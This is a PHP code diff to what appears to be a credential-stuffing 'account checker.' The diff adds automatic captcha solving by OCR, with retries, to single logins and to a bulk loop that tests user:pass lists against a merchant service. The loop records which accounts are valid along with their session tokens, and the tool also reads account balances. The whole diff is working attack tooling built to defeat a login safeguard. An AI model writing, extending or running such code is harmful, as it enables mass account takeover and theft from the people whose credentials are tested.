@@ -4,6 +4,7 @@ declare(strict_types=1);
 require_once dirname(__DIR__) . '/guard.php';
 
 require_once __DIR__ . '/ck-client.php';
+require_once dirname(__DIR__) . '/captcha-ocr.php';
 
 /**
  * Local web interface for account checking.
@@ -78,6 +79,32 @@ function ckBalanceAmount(array $session, array $profile = []): ?string
     return null;
 }
 
+function ckCaptchaHit(array $r): bool
+{
+    $m = (string) ($r['error'] ?? '');
+    $c = (string) ($r['code'] ?? '');
+    return stripos($m, 'captcha') !== false || stripos($c, 'captcha') !== false;
+}
+
+function ckAutoCaptchaLogin(string $user, string $pass, string $merchant): ?array
+{
+    for ($i = 0; $i < 3; $i++) {
+        $cap = ckFetchCaptcha();
+        if (($cap['image'] ?? null) === null) {
+            continue;
+        }
+        $conf = null;
+        $code = ocr_solve_data_uri((string) $cap['image'], $conf);
+        if ($code === null || ($conf !== null && $conf < 0.75)) {
+            continue;
+        }
+        $r = ckLoginRetry($user, $pass, $merchant, null, 1, $code, $cap['id']);
+        if ($r['ok'] || !ckCaptchaHit($r)) {
+            return $r;
+        }
+    }
+    return null;
+}
 function csrfValid(?string $token): bool
 {
     return is_string($token)
@@ -190,6 +217,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             exit;
         }
         $r = ckLoginRetry($user, $pass, $merchant, null, 1, $captcha !== '' ? $captcha : null, $captchaId !== '' ? $captchaId : null);
+        if (!$r['ok'] && ckCaptchaHit($r)) {
+            $auto = ckAutoCaptchaLogin($user, $pass, $merchant);
+            if ($auto !== null) {
+                $r = $auto;
+            }
+        }
         if ($r['ok'] && $r['session'] !== null) {
             $prof = ckProfile($r['session']);
             $v = is_array($prof['body']) ? ($prof['body']['value'] ?? $prof['body']['data'] ?? []) : [];
@@ -277,6 +310,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 continue;
             }
             $r = ckLoginRetry($parts[0], $parts[1], $merchant);
+            if (!$r['ok'] && ckCaptchaHit($r)) {
+                $auto = ckAutoCaptchaLogin($parts[0], $parts[1], $merchant);
+                if ($auto !== null) {
+                    $r = $auto;
+                }
+            }
             if ($r['ok'] && $r['session'] !== null) {
                 $bulkResults[] = ['user' => $parts[0], 'status' => 'valid', 'token' => ckMaskToken($r['session']['token']), 'error' => null];
             } else {
